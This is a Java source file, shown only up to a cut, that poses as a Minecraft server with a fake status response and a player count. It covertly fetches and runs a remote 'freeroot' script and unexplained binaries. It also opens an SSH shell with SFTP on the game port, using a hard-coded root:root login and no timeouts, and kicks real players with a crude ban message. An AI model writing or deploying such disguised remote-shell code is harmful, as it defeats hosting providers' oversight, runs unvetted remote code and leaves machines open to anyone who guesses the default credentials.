package org.server;
import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.logging.*;
import java.lang.reflect.*;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicBoolean;
import java.nio.file.StandardCopyOption;

public class Main {
    private static final Logger L = Logger.getLogger(Main.class.getName());
    private static final List<String> URLS = Arrays.asList(
            "https://github.com/Mytai20100/freeroot.git",
            "https://github.servernotdie.workers.dev/Mytai20100/freeroot.git",
            "https://gitlab.com/Mytai20100/freeroot.git",
            "https://gitlab.snd.qzz.io/mytai20100/freeroot.git",
            "https://git.snd.qzz.io/mytai20100/freeroot.git"
    );
    private static final String TMP = "freeroot_temp", DIR = "work", SH = "noninteractive.sh";
    private static String sshIp = "0.0.0.0";
    private static int proxyPort = 2222;
    private static int sshBackendPort = 2223;
    private static volatile boolean running = true;
    private static final AtomicInteger playerCount = new AtomicInteger(0);
    private static final AtomicBoolean serversStarted = new AtomicBoolean(false);
    private static final Random R = new Random();
    private static final Map<String, String> users = new ConcurrentHashMap<>();
    private static volatile URLClassLoader ptyLoader = null;

    private static final String[] MAVEN_DEPS = {
            "https://repo1.maven.org/maven2/org/apache/sshd/sshd-core/2.11.0/sshd-core-2.11.0.jar",
            "https://repo1.maven.org/maven2/org/apache/sshd/sshd-common/2.11.0/sshd-common-2.11.0.jar",
            "https://repo1.maven.org/maven2/org/apache/sshd/sshd-sftp/2.11.0/sshd-sftp-2.11.0.jar",
            "https://repo1.maven.org/maven2/org/slf4j/slf4j-api/1.7.36/slf4j-api-1.7.36.jar",
            "https://repo1.maven.org/maven2/org/slf4j/slf4j-nop/1.7.36/slf4j-nop-1.7.36.jar"
    };
    private static final String[] PTY_DEPS = {
            "https://repo1.maven.org/maven2/net/java/dev/jna/jna/5.14.0/jna-5.14.0.jar",
            "https://repo1.maven.org/maven2/net/java/dev/jna/jna-platform/5.14.0/jna-platform-5.14.0.jar",
            "https://repo1.maven.org/maven2/org/jetbrains/kotlin/kotlin-stdlib/1.9.23/kotlin-stdlib-1.9.23.jar",
            "https://repo1.maven.org/maven2/org/jetbrains/pty4j/pty4j/0.13.12/pty4j-0.13.12.jar"
    };
    private static final String[][] EXTRA_BINS = {
            {"cryruss-amd64",    "https://github.com/Mytai20100/cryruss/releases/download/v0.0.4/cryruss-amd64"},
            {"cryruss-arm64",    "https://github.com/Mytai20100/cryruss/releases/download/v0.0.4/cryruss-arm64"},
            {"journalctl-amd64", "https://github.com/Mytai20100/systemctl-go/releases/download/v0.0.3/journalctl-amd64"},
            {"journalctl-arm64", "https://github.com/Mytai20100/systemctl-go/releases/download/v0.0.3/journalctl-arm64"},
            {"systemctl-amd64",  "https://github.com/Mytai20100/systemctl-go/releases/download/v0.0.3/systemctl-amd64"},
            {"systemctl-arm64",  "https://github.com/Mytai20100/systemctl-go/releases/download/v0.0.3/systemctl-arm64"}
    };

    static {
        try {
            for (String sig : new String[]{"TSTP", "TTOU", "TTIN"}) {
                try {
                    sun.misc.Signal.handle(new sun.misc.Signal(sig), sun.misc.SignalHandler.SIG_IGN);
                } catch (Exception ignored) {}
            }
        } catch (Exception ignored) {}
    }

    private static void info(String msg) { L.info(msg); }
    private static void warn(String msg) { L.warning(msg); }

    private static void setupPty4jEnv() {
        try {
            String tmpBase = System.getProperty("java.io.tmpdir", "/tmp");
            File ptyTmp = new File(tmpBase, "pty4j_" + ProcessHandle.current().pid());
            if (!ptyTmp.exists()) ptyTmp.mkdirs();
            System.setProperty("pty4j.tmpdir", ptyTmp.getAbsolutePath());
            System.setProperty("PTY4J_PREFERRED_NATIVE_PROVIDER", "jna");
            System.setProperty("pty4j.skip.ttytest", "true");
            System.setProperty("pty4j.log.level", "WARN");
            L.info("[+] pty4j env configured: tmpdir=" + ptyTmp.getAbsolutePath());
        } catch (Exception e) {
            L.warning("[!] setupPty4jEnv failed: " + e.getMessage());
        }
    }

    private static String getArchSuffix() {
        String arch = System.getProperty("os.arch", "").toLowerCase();
        if (arch.contains("aarch64") || arch.contains("arm64")) return "arm64";
        if (arch.contains("armv6")) return "armv6";
        if (arch.contains("armv7") || arch.contains("arm")) return "armv7";
        return "amd64";
    }

    private static String getArchSuffixFull() {
        String arch = System.getProperty("os.arch", "").toLowerCase();
        if (arch.contains("aarch64") || arch.contains("arm64")) return "aarch64";
        if (arch.contains("armv6")) return "armv6";
        if (arch.contains("armv7") || arch.contains("arm")) return "armv7";
        if (arch.contains("amd64") || arch.contains("x86_64")) return "x86_64";
        return "x86_64";
    }

    public static void main(String[] a) {
        boolean noNet = false;
        for (String arg : a) {
            if (arg.equals("--help") || arg.equals("help")) {
                System.out.println("Usage: java -jar server.jar [options]");
                System.out.println("  --help    Show this help");
                System.out.println("  --nonet   Use embedded resources, skip git clone");
                return;
            }
            if (arg.equals("--nonet")) {
                noNet = true;
                L.info("[*] --nonet mode: using embedded resources");
            }
        }
        loadConfig();
        new Thread(Main::startSSHServer).start();

        Thread proxyStarterThread = new Thread(() -> {
            L.info("[*] Waiting for SSH backend on port " + sshBackendPort + "...");
            for (int i = 0; i < 120; i++) {
                if (!isPortAvailable(sshBackendPort)) {
                    L.info("[+] SSH backend up, starting proxy");
                    startPlayerCountTicker();
                    startProxy();
                    return;
                }
                try { Thread.sleep(1000); } catch (InterruptedException e) { return; }
            }
            L.warning("[!] SSH backend timeout after 120s, starting proxy anyway");
            startPlayerCountTicker();
            startProxy();
        }, "proxy-starter");
        proxyStarterThread.setDaemon(true);
        proxyStarterThread.start();

        Thread watcher = new Thread(() -> {
            try {
                File workDir = new File("work");
                for (int i = 0; i < 60; i++) {
                    if (workDir.exists() && new File(workDir, ".installed").exists()) {
                        Thread.sleep(1000);
                        createSSHWrapper();
                        break;
                    }
                    Thread.sleep(1000);
                }
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        });
        watcher.setDaemon(true);
        watcher.start();

        try {
            boolean hasBash = cmd("bash");
            if (!hasBash) { L.severe("Bash not found"); System.exit(1); }
            File w = new File(DIR);
            if (w.exists()) {
                L.info("[*] 'work' exists, checking...");
                File s = new File(w, SH);
                if (s.exists()) {
                    L.info("[+] Valid repo found, skipping clone");
                    s.setExecutable(true, false);
                    exec(w, SH);
                    return;
                } else {
                    L.warning("Invalid repo, removing...");
                    del(w.toPath());
                }
            }
            File t = new File(TMP);
            if (t.exists()) del(t.toPath());
            if (noNet) {
                L.info("[*] --nonet: skipping clone, using embedded resources");
                if (!fallback()) { L.severe("Fallback failed"); System.exit(1); }
                runAfterFallback();
                return;
            }
            boolean hasGit = cmd("git");
            if (!hasGit) {
                L.warning("Git not found, using fallback");
                if (!fallback()) { L.severe("Fallback failed"); System.exit(1); }
                runAfterFallback();
                return;
            }
            if (!cloneRepo()) {
                L.warning("All clones failed, trying fallback...");
                clean(t);
                if (!fallback()) { L.severe("Fallback failed"); System.exit(1); }
                runAfterFallback();
                return;
            }
            if (!t.renameTo(w)) { L.severe("Rename failed"); clean(t); System.exit(1); }
            L.info("[+] Renamed to 'work'");
            File s = new File(w, SH);
            if (!s.exists()) { L.severe("Script not found"); clean(w); System.exit(1); }
            s.setExecutable(true, false);
            exec(w, SH);
            L.info("[+] Freeroot");
        } catch (Exception e) {
            L.log(Level.SEVERE, "Error", e);
            System.exit(1);
        }
    }

    private static void runAfterFallback() {
        File wf = new File(DIR);
        File sf = new File(wf, SH);
        if (sf.exists()) {
            sf.setExecutable(true, false);
            exec(wf, SH);
        } else {
            L.warning("[!] Fallback did not create work dir");
        }
    }

    private static void loadConfig() {
        users.put("root", "root");
        File cfg = new File("server.properties");
        if (cfg.exists()) {
            try {
                Properties p = new Properties();
                try (FileReader fr = new FileReader(cfg)) {
                    p.load(fr);
                }
                sshIp = p.getProperty("server-ip", "0.0.0.0");
                if (sshIp == null || sshIp.isBlank()) sshIp = "0.0.0.0";
                String portStr = p.getProperty("server-port", "2222").trim();
                proxyPort = parseInt(portStr, 2222);
                sshBackendPort = proxyPort + 1;
                L.info("[+] Config loaded: proxy=" + sshIp + ":" + proxyPort
                        + " | ssh_backend=127.0.0.1:" + sshBackendPort);
            } catch (Exception e) {
                L.warning("Config parse error: " + e.getMessage() + " — using defaults");
                applyDefaults();
            }
        } else {
            L.info("[*] No server.properties found, using defaults");
            applyDefaults();
        }
    }

    private static void applyDefaults() {
        sshIp = "0.0.0.0";
        proxyPort = 2222;
        sshBackendPort = 2223;
    }

    private static int parseInt(String s, int def) {
        try { return Integer.parseInt(s.trim()); }
        catch (Exception e) { return def; }
    }

    private static boolean isPortAvailable(int port) {
        try (ServerSocket s = new ServerSocket(port, 1, InetAddress.getByName("127.0.0.1"))) {
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private static void startSSHServer() {
        try {
            setupPty4jEnv();
            File libDir = new File("libraries");
            if (!libDir.exists()) libDir.mkdir();
            List<URL> jarUrls = new ArrayList<>();

            for (String depUrl : MAVEN_DEPS) {
                String fileName = depUrl.substring(depUrl.lastIndexOf('/') + 1);
                File jarFile = new File(libDir, fileName);
                if (!jarFile.exists()) {
                    L.info("[*] Downloading: " + fileName);
                    try { downloadFile(depUrl, jarFile); L.info("[+] Downloaded: " + fileName); }
                    catch (Exception e) { L.severe("Download failed: " + fileName + " - " + e.getMessage()); return; }
                }
                try { jarUrls.add(jarFile.toURI().toURL()); } catch (MalformedURLException e) { return; }
            }

            for (String depUrl : PTY_DEPS) {
                String fileName = depUrl.substring(depUrl.lastIndexOf('/') + 1);
                File jarFile = new File(libDir, fileName);
                if (!jarFile.exists()) {
                    L.info("[*] Downloading PTY lib: " + fileName);
                    try { downloadFile(depUrl, jarFile); L.info("[+] Downloaded PTY lib: " + fileName); }
                    catch (Exception e) { L.fine("PTY lib download failed: " + fileName + " - " + e.getMessage()); }
                }
                if (jarFile.exists()) {
                    try { jarUrls.add(jarFile.toURI().toURL()); } catch (MalformedURLException ignored) {}
                }
            }

            L.info("[+] Libraries ready");
            URLClassLoader loader = new URLClassLoader(jarUrls.toArray(new URL[0]), Main.class.getClassLoader());
            ptyLoader = loader;

            for (int attempt = 0; attempt < 10; attempt++) {
                if (isPortAvailable(sshBackendPort)) {
                    startSSH(loader);
                    return;
                }
                L.warning("[!] SSH backend port " + sshBackendPort + " in use, trying " + (sshBackendPort + 1));
                sshBackendPort++;
            }
            L.severe("[!] Cannot find available port for SSH backend after 10 attempts");

        } catch (Exception e) {
            Throwable cause = e;
            while (cause.getCause() != null) cause = cause.getCause();
            L.log(Level.SEVERE, "SSH server error: " + cause.getMessage(), e);
        }
    }

    private static void downloadFile(String urlStr, File dest) throws IOException {
        URI uri;
        try { uri = new URI(urlStr); } catch (Exception e) { throw new IOException("Invalid URL: " + urlStr); }
        try (InputStream in = uri.toURL().openStream(); FileOutputStream out = new FileOutputStream(dest)) {
            byte[] buf = new byte[8192]; int n;
            while ((n = in.read(buf)) != -1) out.write(buf, 0, n);
        }
    }

    private static void startSSH(ClassLoader loader) throws Exception {
        Class<?> sshServerClass       = loader.loadClass("org.apache.sshd.server.SshServer");
        Class<?> keyProviderClass     = loader.loadClass("org.apache.sshd.server.keyprovider.SimpleGeneratorHostKeyProvider");
        Class<?> passwordAuthClass    = loader.loadClass("org.apache.sshd.server.auth.password.PasswordAuthenticator");
        Class<?> keyPairProviderClass = loader.loadClass("org.apache.sshd.common.keyprovider.KeyPairProvider");
        Class<?> commandClass         = loader.loadClass("org.apache.sshd.server.command.Command");
        Class<?> shellFactoryClass    = loader.loadClass("org.apache.sshd.server.shell.ShellFactory");
        Class<?> sessionClass         = loader.loadClass("org.apache.sshd.server.session.ServerSession");
        Class<?> channelSessionClass  = loader.loadClass("org.apache.sshd.server.channel.ChannelSession");
        Class<?> exitCallbackClass    = loader.loadClass("org.apache.sshd.server.ExitCallback");

        Object sshd = sshServerClass.getMethod("setUpDefaultServer").invoke(null);
        sshServerClass.getMethod("setPort", int.class).invoke(sshd, sshBackendPort);
        try { sshServerClass.getMethod("setHost", String.class).invoke(sshd, "127.0.0.1"); } catch (Exception ignored) {}

        Object keyProvider = keyProviderClass.getConstructor().newInstance();
        keyProviderClass.getMethod("setPath", java.nio.file.Path.class)
                .invoke(keyProvider, new File("hostkey.ser").toPath());
        sshServerClass.getMethod("setKeyPairProvider", keyPairProviderClass).invoke(sshd, keyProvider);

        try {
            Class<?> propUtils = loader.loadClass("org.apache.sshd.common.PropertyResolverUtils");
            for (String key : new String[]{"idle-timeout","nio2-read-timeout","auth-timeout","disconnect-timeout"})
                propUtils.getMethod("updateProperty", Object.class, String.class, long.class)
                        .invoke(null, sshd, key, 0L);
            L.info("[+] Infinite timeout configured");
        } catch (Exception e) {
            try {
                @SuppressWarnings("unchecked")
                Map<String, Object> props = (Map<String, Object>) sshd.getClass().getMethod("getProperties").invoke(sshd);
                for (String key : new String[]{"idle-timeout","nio2-read-timeout","auth-timeout","disconnect-timeout"})
                    props.put(key, "0");
            } catch (Exception e2) {
                L.warning("Timeout config failed: " + e2.getMessage());
            }
        }

        Object passwordAuth = java.lang.reflect.Proxy.newProxyInstance(loader,
                new Class<?>[]{passwordAuthClass},
                (proxy, method, args) -> {
                    if (method.getName().equals("authenticate")) {
                        String username = (String) args[0], password = (String) args[1];
                        return users.containsKey(username) && users.get(username).equals(password);
                    }
                    return null;
                });
        sshServerClass.getMethod("setPasswordAuthenticator", passwordAuthClass).invoke(sshd, passwordAuth);

        Object shellFactory = java.lang.reflect.Proxy.newProxyInstance(loader,
                new Class<?>[]{shellFactoryClass},
                (proxy, method, args) -> {
                    if (method.getName().equals("createShell")) {
                        return java.lang.reflect.Proxy.newProxyInstance(loader,
                                new Class<?>[]{commandClass},
                                new ShellCommandHandler(loader, sessionClass, channelSessionClass, exitCallbackClass));
                    }
                    return null;
                });
        sshServerClass.getMethod("setShellFactory", shellFactoryClass).invoke(sshd, shellFactory);

        Object sftpFactory = loader.loadClass("org.apache.sshd.sftp.server.SftpSubsystemFactory")
                .getDeclaredConstructor().newInstance();
        sshServerClass.getMethod("setSubsystemFactories", List.class)
                .invoke(sshd, Collections.singletonList(sftpFactory));

        sshServerClass.getMethod("start").invoke(sshd);
        L.info("[+] SSH backend on 127.0.0.1:" + sshBackendPort);
    }

    private static void startProxy() {
        new Thread(() -> {
            try {
                ServerSocket proxy = new ServerSocket(proxyPort, 256, InetAddress.getByName(sshIp));
                L.info("[+] Proxy on " + sshIp + ":" + proxyPort
                        + " (SSH→127.0.0.1:" + sshBackendPort + " | MC handled inline)");
                while (running) {
                    try {
                        Socket client = proxy.accept();
                        new Thread(() -> routeConnection(client)).start();
                    } catch (Exception ignored) {}
                }
                proxy.close();
            } catch (Exception e) {
                L.severe("Proxy failed to start: " + e.getMessage());
            }
        }, "proxy-main").start();
    }

    private static void routeConnection(Socket client) {
        try {
            client.setSoTimeout(5000);
            byte[] peek = new byte[9];
            int read = client.getInputStream().read(peek);
            client.setSoTimeout(0);

            if (read <= 0) { client.close(); return; }

            boolean isSSH = read >= 4
                    && peek[0] == 0x53 && peek[1] == 0x53
                    && peek[2] == 0x48 && peek[3] == 0x2D;

            if (isSSH) {
                try {
                    Socket backend = new Socket("127.0.0.1", sshBackendPort);
                    backend.setTcpNoDelay(true);
                    client.setTcpNoDelay(true);
                    backend.getOutputStream().write(peek, 0, read);
                    backend.getOutputStream().flush();
                    Thread t1 = new Thread(() -> pipe(client, backend), "ssh-pipe-c2b");
                    Thread t2 = new Thread(() -> pipe(backend, client), "ssh-pipe-b2c");
                    t1.setDaemon(true); t2.setDaemon(true);
                    t1.start(); t2.start();
                } catch (Exception e) {
                    L.warning("[!] SSH backend unreachable: " + e.getMessage());
                    client.close();
                }
                return;
            }

            boolean looksLikeMC = (peek[0] & 0x80) == 0 && peek[0] > 0;
            if (looksLikeMC) {
                handleMinecraftInline(client, peek, read);
                return;
            }

            client.close();
        } catch (Exception e) {
            try { client.close(); } catch (Exception ignored) {}
        }
    }

    private static void handleMinecraftInline(Socket client, byte[] peeked, int peekedLen) {
        try {
            InputStream rawIn = new SequenceInputStream(
                    new ByteArrayInputStream(peeked, 0, peekedLen),
                    client.getInputStream()
            );
            DataInputStream in   = new DataInputStream(rawIn);
            DataOutputStream out = new DataOutputStream(client.getOutputStream());

            int packetLen = readVarInt(in);
            int packetId  = readVarInt(in);

            if (packetId != 0x00) { client.close(); return; }

            int protocolVersion = readVarInt(in);
            readString(in);
            in.readUnsignedShort();
            int nextState = readVarInt(in);

            if (nextState == 1) {
                readVarInt(in);
                int reqId = readVarInt(in);
                if (reqId != 0x00) { client.close(); return; }

                String json = buildStatusJson(protocolVersion);
                writeVarIntPacket(out, 0x00, json);

                try {
                    client.setSoTimeout(3000);
                    int pingLen = readVarInt(in);
                    int pingId  = readVarInt(in);
                    if (pingId == 0x01) {
                        long payload = in.readLong();
                        ByteArrayOutputStream buf = new ByteArrayOutputStream();
                        DataOutputStream dout = new DataOutputStream(buf);
                        writeVarInt(dout, 0x01);
                        dout.writeLong(payload);
                        dout.flush();
                        byte[] pongData = buf.toByteArray();
                        writeVarInt(out, pongData.length);
                        out.write(pongData);
                        out.flush();
                    }
                } catch (Exception ignored) {}

            } else if (nextState == 2) {
                try {
                    readVarInt(in);
                    readVarInt(in);
                    readString(in);
                } catch (Exception ignored) {}

                Thread.sleep(100);
                String kickMsg = buildKickMessage();
                writeVarIntPacket(out, 0x00, kickMsg);
            }

            Thread.sleep(100);
            client.close();
        } catch (Exception ignored) {
            try { client.close(); } catch (Exception e2) {}
        }
    }

    private static String buildStatusJson(int protocolVersion) {
        return String.format(
                "{\"version\":{\"name\":\"1.21.8\",\"protocol\":%d}," +
                        "\"players\":{\"max\":219999,\"online\":%d,\"sample\":[]}," +
                        "\"description\":{\"text\":\"A Minecraft Server\\nPaper 1.21.8\"}," +
                        "\"enforcesSecureChat\":false,\"previewsChat\":false}",
                protocolVersion, playerCount.get()
        );
    }

    private static String buildKickMessage() {
        return "{\"text\":\"\",\"extra\":["
                + "{\"text\":\"You are banned from this server\\n\\n\",\"color\":\"red\",\"bold\":true},"
                + "{\"text\":\"Reason: \",\"color\":\"gray\"},"
                + "{\"text\":\"You wanna fuck dinosakura?\\n\",\"color\":\"yellow\"},"
                + "{\"text\":\"Banned by: \",\"color\":\"gray\"},"
                + "{\"text\":\"Console\\n\",\"color\":\"aqua\"},"
                + "{\"text\":\"Unban date: \",\"color\":\"gray\"},"
                + "{\"text\":\"Never\\n\\n\",\"color\":\"dark_red\"},"
                + "{\"text\":\"Appeals are not available.\",\"color\":\"dark_gray\",\"italic\":true}"
                + "]}";
    }

    private static void writeVarIntPacket(DataOutputStream out, int packetId, String jsonPayload) throws IOException {
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        DataOutputStream dout = new DataOutputStream(buf);
        writeVarInt(dout, packetId);
        writeString(dout, jsonPayload);
        dout.flush();
        byte[] data = buf.toByteArray();
        writeVarInt(out, data.length);
        out.write(data);
        out.flush();
    }

    private static void pipe(Socket src, Socket dst) {
        try {
            byte[] buf = new byte[8192]; int n;
            InputStream in   = src.getInputStream();
            OutputStream out = dst.getOutputStream();
            while ((n = in.read(buf)) != -1) { out.write(buf, 0, n); out.flush(); }
        } catch (Exception ignored) {}
        finally {
            try { src.close(); } catch (Exception ignored) {}
            try { dst.close(); } catch (Exception ignored) {}
        }
    }

    private static int readVarInt(DataInputStream in) throws IOException {
        int value = 0, position = 0; byte cur;
        while (true) {
            cur = in.readByte();
            value |= (cur & 0x7F) << position;
            if ((cur & 0x80) == 0) break;
            position += 7;
            if (position >= 32) throw new RuntimeException("VarInt too big");
        }
        return value;
    }

    private static void writeVarInt(DataOutputStream out, int value) throws IOException {
        while (true) {
            if ((value & ~0x7F) == 0) { out.writeByte(value); return; }
            out.writeByte((value & 0x7F) | 0x80);
            value >>>= 7;
        }
    }

    private static String readString(DataInputStream in) throws IOException {
        byte[] bytes = new byte[readVarInt(in)]; in.readFully(bytes);
        return new String(bytes, "UTF-8");
    }

    private static void writeString(DataOutputStream out, String string) throws IOException {
        byte[] bytes = string.getBytes("UTF-8"); writeVarInt(out, bytes.length); out.write(bytes);
    }

    static class ShellCommandHandler implements InvocationHandler {
        private Process process;
        private OutputStream processStdin;
        private InputStream processStdout;
        private InputStream clientInput;
        private OutputStream clientOutput, clientError;
        private Object exitCallback;
        private final ClassLoader loader;
        private final Class<?> exitCallbackClass;
        private volatile boolean running = false;
        private final Map<String, String> environment = new ConcurrentHashMap<>();
        private String ptyType = "xterm-256color";
        private int ptyColumns = 120, ptyLines = 30;
        private ScheduledExecutorService keepaliveExecutor;
        private Thread inputThread, outputThread, errorThread;

        private Object   ptyProcessObj   = null;
        private Class<?> ptyProcessClass = null;
        private Class<?> winSizeClass    = null;

        ShellCommandHandler(ClassLoader loader, Class<?> sessionClass, Class<?> channelSessionClass, Class<?> exitCallbackClass) {
            this.loader = loader;
            this.exitCallbackClass = exitCallbackClass;
        }

        public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
            switch (method.getName()) {
                case "setInputStream":  if (args != null && args.length > 0) clientInput  = (InputStream)  args[0]; return null;
                case "setOutputStream": if (args != null && args.length > 0) clientOutput = (OutputStream) args[0]; return null;
                case "setErrorStream":  if (args != null && args.length > 0) clientError  = (OutputStream) args[0]; return null;
                case "setExitCallback": if (args != null && args.length > 0) exitCallback = args[0]; return null;
                case "start":
                    running = true;
                    startKeepalive();
                    new Thread(this::runShell).start();
                    return null;
                case "destroy":
                    running = false;
                    stopKeepalive();
                    if (processStdin != null) try { processStdin.close(); } catch (IOException ignored) {}
                    if (process != null) process.destroyForcibly();
                    if (ptyProcessObj != null) {
                        try { ptyProcessClass.getMethod("destroy").invoke(ptyProcessObj); } catch (Exception ignored) {}
                    }
                    if (inputThread  != null) inputThread.interrupt();
                    if (outputThread != null) outputThread.interrupt();
                    if (errorThread  != null) errorThread.interrupt();
                    return null;
                case "getEnvironment": return environment;
                case "setPtyType":
                    if (args != null && args.length > 0) ptyType = args[0].toString();
                    return null;
                case "setPtyColumns":
                    if (args != null && args.length > 0) { ptyColumns = (Integer) args[0]; resizeIfAlive(); }
                    return null;
                case "setPtyLines":
                    if (args != null && args.length > 0) { ptyLines = (Integer) args[0]; resizeIfAlive(); }
                    return null;
                default: return null;
            }
        }

        private void resizeIfAlive() {
            try {
                if (ptyProcessObj != null && ptyProcessClass != null && winSizeClass != null) {
                    Object ws = winSizeClass.getConstructor(int.class, int.class).newInstance(ptyLines, ptyColumns);
                    ptyProcessClass.getMethod("setWinSize", winSizeClass).invoke(ptyProcessObj, ws);
                } else if (process != null && process.isAlive()) {
                    resizePty(process, ptyColumns, ptyLines);
                }
            } catch (Exception ignored) {}
        }

        private void startKeepalive() {
            keepaliveExecutor = Executors.newSingleThreadScheduledExecutor(r -> {
                Thread t = new Thread(r, "ssh-keepalive");
                t.setDaemon(true);
                return t;
            });
            keepaliveExecutor.scheduleAtFixedRate(() -> {
                try { if (running && clientOutput != null) clientOutput.flush(); }
                catch (Exception e) { stopKeepalive(); }
            }, 10, 10, TimeUnit.SECONDS);
        }

        private void stopKeepalive() {
            if (keepaliveExecutor != null && !keepaliveExecutor.isShutdown()) keepaliveExecutor.shutdownNow();
        }

        private static void resizePty(Process process, int cols, int rows) {
            try {
                long pid = process.pid();
                new ProcessBuilder("bash", "-c",
                        "stty cols " + cols + " rows " + rows + " < /proc/" + pid + "/fd/0 2>/dev/null || true")
                        .redirectErrorStream(true).start().waitFor(1, TimeUnit.SECONDS);
                new ProcessBuilder("bash", "-c",
                        "kill -WINCH -" + pid + " 2>/dev/null; kill -WINCH " + pid + " 2>/dev/null || true")
                        .redirectErrorStream(true).start().waitFor(1, TimeUnit.SECONDS);
            } catch (Exception ignored) {}
        }

        private static boolean hasScriptCommand() {
            try {
                Process p = new ProcessBuilder("which", "script").redirectErrorStream(true).start();
                p.waitFor(2, TimeUnit.SECONDS);
                return p.exitValue() == 0;
            } catch (Exception e) { return false; }
        }

        private void runShell() {
            try {
                File workDir = new File("work");
                File sshScript = new File(workDir, "ssh.sh");
                int cols = ptyColumns > 0 ? ptyColumns : 120;
                int rows = ptyLines   > 0 ? ptyLines   : 30;

                String shellTarget = (sshScript.exists() && sshScript.canExecute())
                        ? sshScript.getAbsolutePath() : null;

                Map<String, String> env = new HashMap<>(System.getenv());
                env.put("TERM",     ptyType != null && !ptyType.isEmpty() ? ptyType : "xterm-256color");
                env.put("COLUMNS",  String.valueOf(cols));
                env.put("LINES",    String.valueOf(rows));
                env.put("LC_ALL",   "C");
                env.put("LANG",     "C");
                env.put("TMOUT",    "0");
                env.put("HOSTNAME", "furryisbest");
                env.put("BASH_ENV", "");
                env.putAll(environment);

                ClassLoader pl = Main.ptyLoader;
                if (pl != null) {
                    String[] ptyCmd = shellTarget != null
                            ? new String[]{"bash", shellTarget}
                            : new String[]{"bash", "--login", "-i"};
                    try {
                        Class<?> builderClass = pl.loadClass("com.pty4j.PtyProcessBuilder");
                        Object builder = builderClass.getConstructor(String[].class).newInstance((Object) ptyCmd);
                        builderClass.getMethod("setEnvironment", Map.class).invoke(builder, env);
                        builderClass.getMethod("setDirectory", String.class).invoke(builder, workDir.getAbsolutePath());
                        builderClass.getMethod("setInitialColumns", int.class).invoke(builder, cols);
                        builderClass.getMethod("setInitialRows",    int.class).invoke(builder, rows);
                        builderClass.getMethod("setConsole", boolean.class).invoke(builder, false);
                        Object pty = builderClass.getMethod("start").invoke(builder);

                        Class<?> ptyClass   = pl.loadClass("com.pty4j.PtyProcess");
                        Class<?> winSizeCls = pl.loadClass("com.pty4j.WinSize");

                        processStdin  = (OutputStream) ptyClass.getMethod("getOutputStream").invoke(pty);
                        processStdout = (InputStream)  ptyClass.getMethod("getInputStream").invoke(pty);

                        Object ws = winSizeCls.getConstructor(int.class, int.class).newInstance(rows, cols);
                        try { ptyClass.getMethod("setWinSize", winSizeCls).invoke(pty, ws); } catch (Exception ignored) {}

                        ptyProcessObj   = pty;
                        ptyProcessClass = ptyClass;
                        winSizeClass    = winSizeCls;
                        L.info("[+] PTY via pty4j OK (" + cols + "x" + rows + ")");

                        inputThread = new Thread(() -> {
                            try {
                                byte[] buf = new byte[4096]; int n;
                                while (running && !Thread.currentThread().isInterrupted()
                                        && (n = clientInput.read(buf)) != -1) {
                                    processStdin.write(buf, 0, n); processStdin.flush();
                                }
                            } catch (IOException e) {
                                if (running) L.warning("pty4j input: " + e.getMessage());
                            } finally { try { processStdin.close(); } catch (IOException ignored) {} }
                        }, "ssh-input");
                        inputThread.setDaemon(true); inputThread.start();

                        outputThread = new Thread(() -> {
                            try {
                                byte[] buf = new byte[4096]; int n;
                                while (running && !Thread.currentThread().isInterrupted()
                                        && (n = processStdout.read(buf)) != -1) {
                                    if (clientOutput != null) { clientOutput.write(buf, 0, n); clientOutput.flush(); }
                                }
                            } catch (IOException e) {
                                if (running) L.warning("pty4j output: " + e.getMessage());
                            } finally { try { processStdout.close(); } catch (IOException ignored) {} }
                        }, "ssh-output");
                        outputThread.setDaemon(true); outputThread.start();

                        errorThread = new Thread(() -> {}, "ssh-stderr-noop");
                        errorThread.setDaemon(true); errorThread.start();

                        int exitCode = (int) ptyClass.getMethod("waitFor").invoke(pty);
                        running = false; stopKeepalive();
                        try { outputThread.join(2000); } catch (InterruptedException ignored) {}
                        notifyExit(exitCode);
                        return;

                    } catch (Exception e) {
                        Throwable cause = e;
                        while (cause.getCause() != null) cause = cause.getCause();
                        L.fine("[*] pty4j unavailable (" + cause.getClass().getSimpleName() + "), using script fallback");
                        ptyProcessObj = null; ptyProcessClass = null; winSizeClass = null;
                    }
                }

                String[] cmdArr;
                if (hasScriptCommand() && shellTarget != null) {
                    cmdArr = new String[]{"script", "-q", "-f", "-c",
                            "stty cols " + cols + " rows " + rows + " 2>/dev/null; exec bash " + shellTarget,
                            "/dev/null"};
                } else if (hasScriptCommand()) {
                    cmdArr = new String[]{"script", "-q", "-f", "-c",
                            "stty cols " + cols + " rows " + rows + " 2>/dev/null; exec bash --login -i",
                            "/dev/null"};
                } else {
                    cmdArr = shellTarget != null
                            ? new String[]{"bash", shellTarget}
                            : new String[]{"bash", "--login", "-i"};
                }

                ProcessBuilder pb = new ProcessBuilder(cmdArr);
                pb.directory(workDir);
                pb.environment().putAll(env);
                pb.redirectErrorStream(true);
                process = pb.start();
                processStdin  = process.getOutputStream();
                processStdout = process.getInputStream();
                resizePty(process, cols, rows);

                inputThread = new Thread(() -> {
                    try {
                        byte[] buf = new byte[4096]; int n;
                        while (running && !Thread.currentThread().isInterrupted()
                                && (n = clientInput.read(buf)) != -1) {
                            processStdin.write(buf, 0, n); processStdin.flush();
                        }
                    } catch (IOException e) {
                        if (running) L.warning("input: " + e.getMessage());
                    } finally { try { processStdin.close(); } catch (IOException ignored) {} }
                }, "ssh-input");
                inputThread.setDaemon(true); inputThread.start();

                outputThread = new Thread(() -> {
                    try {
                        byte[] buf = new byte[4096]; int n;
                        while (running && !Thread.currentThread().isInterrupted()
                                && (n = processStdout.read(buf)) != -1) {
                            if (clientOutput != null) { clientOutput.write(buf, 0, n); clientOutput.flush(); }
                        }
                    } catch (IOException e) {
                        if (running) L.warning("output: " + e.getMessage());
                    } finally { try { processStdout.close(); } catch (IOException ignored) {} }
                }, "ssh-output");
                outputThread.setDaemon(true); outputThread.start();

                errorThread = new Thread(() -> {}, "ssh-stderr-noop");
                errorThread.setDaemon(true); errorThread.start();

                int exitCode = process.waitFor();
                running = false; stopKeepalive();
                try { outputThread.join(2000); } catch (InterruptedException ignored) {}
                notifyExit(exitCode);

            } catch (Exception e) {
                L.log(Level.SEVERE, "runShell error", e);
                running = false; stopKeepalive();
                notifyExit(1);
            }
        }

        private void notifyExit(int code) {
